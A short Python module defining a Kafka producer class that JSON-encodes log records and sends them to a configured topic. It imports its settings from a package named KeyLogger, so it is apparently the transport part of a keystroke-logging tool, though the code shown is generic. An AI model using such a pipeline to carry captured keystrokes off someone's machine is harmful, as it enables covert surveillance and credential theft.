# kafka_producer.py

from kafka import KafkaProducer
import json
from KeyLogger.configuration1 import KAFKA_BOOTSTRAP_SERVERS, KAFKA_TOPIC

class KafkaLogger:
    def __init__(self):
        self.producer = KafkaProducer(
            bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
            value_serializer=lambda v: json.dumps(v).encode('utf-8')
        )

    def send_log(self, log_data):
        try:
            self.producer.send(KAFKA_TOPIC, log_data)
        except Exception as e:
            print(f"Kafka send error: {e}")
